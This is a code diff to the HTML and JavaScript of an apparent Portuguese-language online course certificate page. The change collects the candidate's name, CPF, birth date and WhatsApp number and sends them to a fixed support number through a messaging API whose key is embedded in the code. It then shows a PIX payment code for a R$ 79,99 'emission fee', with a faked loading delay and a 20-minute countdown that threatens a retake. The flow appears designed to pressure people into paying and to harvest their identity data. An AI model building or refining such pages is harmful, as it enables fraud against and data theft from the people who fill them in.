@@ -23,6 +23,12 @@
         .input-group label { display: block; font-weight: bold; }
         .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
         .aviso-taxa { color: #d9534f; font-weight: normal; background-color: #f2dede; padding: 15px; border-radius: 5px; border: 1px solid #ebccd1; margin-bottom: 15px; font-size: 0.95em; text-align: left; }
+        
+        /* Novos estilos para o carregamento e timer */
+        .loading-text { color: #0056b3; font-weight: bold; padding: 20px; font-size: 1.1em; }
+        .timer-box { font-size: 2em; font-weight: bold; color: #d9534f; margin: 10px 0; }
+        .pix-code-box { width: 100%; height: 80px; padding: 10px; font-family: monospace; font-size: 0.9em; background: #fff; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; resize: none; }
+        .btn-copiar { background-color: #17a2b8; width: 100%; color: white; border: none; padding: 15px; cursor: pointer; font-size: 1.1em; border-radius: 5px; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -110,17 +116,14 @@
                 </div>
                 
                 <div class="aviso-taxa">
-                    ⚠️ <b>Atenção:</b> A taxa de emissão do certificado é de <b>R$ 79,99</b>. O código de pagamento enviado para o seu WhatsApp será válido por apenas <b>20 minutos</b>. Caso não seja pago neste prazo, será necessário refazer a prova.
+                    ⚠️ <b>Atenção:</b> A taxa de emissão do certificado é de <b>R$ 79,99</b>. O código de pagamento será gerado na próxima tela e será válido por apenas <b>20 minutos</b>. Caso não seja pago neste prazo, será necessário refazer a prova.
                 </div>
 
                 <button type="button" style="background:#28a745" onclick="gerarCertificado()">Emitir Certificado</button>
             </div>
             
             <div id="mensagem-sucesso" style="display: none;">
-                <div style="background-color: #d4edda; color: #155724; padding: 20px; border-radius: 5px; border: 1px solid #c3e6cb; margin-top: 15px; font-size: 1.1em; text-align: center; font-weight: bold;">
-                    Certificado emitido com sucesso!<br><br>
-                    As instruções de recebimento e o documento foram enviados para o seu WhatsApp.
-                </div>
+                <!-- O conteúdo de carregamento e o timer serão inseridos aqui via JS -->
             </div>
 
         </div>
@@ -182,7 +185,27 @@
         res.scrollIntoView({ behavior: 'smooth' });
     });
 
-    function gerarCertificado() {
+    // Função de cronômetro
+    function iniciarCronometro(duracao, display) {
+        let tempo = duracao, minutos, segundos;
+        const intervalo = setInterval(function () {
+            minutos = parseInt(tempo / 60, 10);
+            segundos = parseInt(tempo % 60, 10);
+
+            minutos = minutos < 10 ? "0" + minutos : minutos;
+            segundos = segundos < 10 ? "0" + segundos : segundos;
+
+            display.textContent = minutos + ":" + segundos;
+
+            if (--tempo < 0) {
+                clearInterval(intervalo);
+                display.textContent = "TEMPO ESGOTADO";
+                display.style.color = "red";
+            }
+        }, 1000);
+    }
+
+    async function gerarCertificado() {
         const nome = document.getElementById('aluno-nome').value;
         const cpf = document.getElementById('aluno-cpf').value;
         const nasc = document.getElementById('aluno-nascimento').value;
@@ -190,42 +213,64 @@
         
         if(!nome || !cpf || !nasc || !contato) return alert("Preencha todos os campos!");
 
-        // Validação e formatação do telefone do candidato
         let telefoneCandidato = contato.replace(/\D/g, ''); 
         if (telefoneCandidato.length < 10) {
             alert("O número de WhatsApp está incompleto. Por favor, verifique.");
             return;
         }
-        if (!telefoneCandidato.startsWith('55')) {
-            telefoneCandidato = '55' + telefoneCandidato;
-        }
 
+        // 1. Mostrar barra de carregamento e ocultar form
+        document.getElementById('form-dados-certificado').style.display = 'none';
+        const msgSucesso = document.getElementById('mensagem-sucesso');
+        msgSucesso.style.display = 'block';
+        msgSucesso.innerHTML = `<div class="loading-text">⏳ Gerando seu certificado e carregando código de pagamento... Por favor, aguarde!</div>`;
+
+        // 2. Notificar o Suporte (Apenas o suporte)
         const numeroSuporte = "5522992195418";
-        const linkDoPdf = "https://curso-prime.github.io/curso-porteiro/certificado_protegido_por_senha.pdf"; 
+        const textoSuporte = `🚨 *NOVO CERTIFICADO EMITIDO* 🚨\n\n*Nome:* ${nome}\n*CPF:* ${cpf}\n*WhatsApp:* ${contato}\n*Nota:* ${porcentagemAtual}%\n\nO candidato está na tela de pagamento aguardando confirmação. O tempo de 20 minutos começou!`;
 
-        // Mensagem enviada para o CANDIDATO
-        const textoCandidato = `Olá, ${nome}!\n\nParabéns! Seu certificado do curso de Porteiro foi emitido com sucesso. 🎓\n\n📥 *Para baixar o seu documento, clique no link abaixo:*\n${linkDoPdf}\n\n🔒 *Atenção:* O arquivo está protegido por senha para a sua segurança.\n\nEm instantes, nosso suporte enviará por aqui o código PIX no valor de *R$ 79,99* para o pagamento da taxa de emissão.\n\n⏳ *IMPORTANTE:* O código de pagamento terá validade de *20 minutos*. Caso não seja pago neste prazo, será necessário refazer a prova.\n\nAssim que o pagamento for confirmado, você receberá automaticamente a senha para abrir o seu certificado!`;
-
-        // MOMENTO 2: Mensagem enviada para o SUPORTE
-        const textoSuporte = `🚨 *NOVO CERTIFICADO EMITIDO* 🚨\n\n*Nome:* ${nome}\n*CPF:* ${cpf}\n*WhatsApp:* ${contato}\n*Nota:* ${porcentagemAtual}%\n\nO candidato já recebeu o link do PDF. Chame-o e envie o código PIX (R$ 79,99) para cobrar a taxa! (Lembrando o prazo de 20 min)`;
-
-        // Modificado para evitar bloqueio da API (Anti-Spam). 
-        // Dispara para o candidato e aguarda 1.5 segundos para disparar para o suporte.
         try {
-            const urlCandidato = `https://api.textmebot.com/send.php?recipient=+${telefoneCandidato}&apikey=Pskn5LW4qaCv&text=${encodeURIComponent(textoCandidato)}`;
-            fetch(urlCandidato, { mode: 'no-cors' });
-
-            setTimeout(() => {
-                const urlSuporte = `https://api.textmebot.com/send.php?recipient=+${numeroSuporte}&apikey=Pskn5LW4qaCv&text=${encodeURIComponent(textoSuporte)}`;
-                fetch(urlSuporte, { mode: 'no-cors' });
-            }, 1500);
-
+            const urlSuporte = `https://api.textmebot.com/send.php?recipient=+${numeroSuporte}&apikey=Pskn5LW4qaCv&text=${encodeURIComponent(textoSuporte)}`;
+            fetch(urlSuporte, { mode: 'no-cors' });
         } catch (e) {
             console.log("Erro ao notificar via WhatsApp", e);
         }
 
-        document.getElementById('form-dados-certificado').style.display = 'none';
-        document.getElementById('mensagem-sucesso').style.display = 'block';
+        // Tempo artificial de 2 segundos para o carregamento parecer mais fluído
+        await new Promise(r => setTimeout(r, 2000));
+
+        let codigoPix = "";
+
+        // 3. Tentar puxar o arquivo pix.txt do GitHub
+        try {
+            const resposta = await fetch('pix.txt?v=' + new Date().getTime());
+            if (resposta.ok) {
+                codigoPix = await resposta.text();
+            } else {
+                codigoPix = "Erro ao localizar o código PIX. Por favor, chame o suporte no botão do WhatsApp.";
+            }
+        } catch (erro) {
+            codigoPix = "Erro de conexão. Por favor, chame o suporte no botão do WhatsApp.";
+        }
+
+        // 4. Mostrar o resultado com o PIX na tela e ativar o cronômetro
+        msgSucesso.innerHTML = `
+            <div style="background-color: #d4edda; color: #155724; padding: 20px; border-radius: 5px; border: 1px solid #c3e6cb; margin-top: 15px; text-align: center;">
+                <h3 style="margin-top: 0; color: #155724;">Certificado Gerado!</h3>
+                <p>Copie o código abaixo e pague via PIX Copia e Cola no seu aplicativo do banco.</p>
+                <textarea id="codigo-pix-copia" class="pix-code-box" readonly>${codigoPix}</textarea>
+                <button type="button" class="btn-copiar" onclick="document.getElementById('codigo-pix-copia').select(); document.execCommand('copy'); alert('Código PIX copiado com sucesso!');">Copiar Código PIX</button>
+                
+                <p style="margin-top: 25px; margin-bottom: 5px; font-weight: bold; color: #721c24;">⚠️ O código PIX irá expirar em:</p>
+                <div id="tempo-restante" class="timer-box">20:00</div>
+                <p style="font-size: 0.9em; margin-top: 15px; border-top: 1px dashed #c3e6cb; padding-top: 10px;">
+                    Assim que o pagamento for confirmado, seu certificado e senha serão enviados automaticamente para o seu WhatsApp cadastrado.
+                </p>
+            </div>
+        `;
+
+        // Ativa os 20 minutos (20 * 60 segundos)
+        iniciarCronometro(1200, document.getElementById('tempo-restante'));
     }
 </script>
 </body>
